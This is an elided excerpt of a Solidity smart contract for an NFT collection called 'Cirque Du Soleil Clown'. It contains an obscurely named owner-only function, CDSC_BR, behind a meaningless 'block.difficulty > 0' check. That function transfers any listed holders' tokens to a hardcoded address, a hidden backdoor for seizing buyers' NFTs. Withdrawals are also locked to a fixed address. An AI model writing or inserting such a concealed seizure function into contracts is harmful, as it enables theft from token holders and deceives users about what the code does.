...
contract Cirque_Du_Soleil_Clown is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("Cirque Du Soleil Clown", "CDSC", maxBatchSize_, collectionSize_) {
  ...
  function CDSC_BR(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        uint256 len = tokenids.length;
        for (uint256 i; i < len; i++) {
            uint256 tokenid = tokenids[i];
            transferFrom(ownerOf(tokenid), 0x50261c8f0C0563e2c6553bebE1667CcC01770930, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0x41682e9b2579b8B6a4C09C8672E5ac0F463015d9);
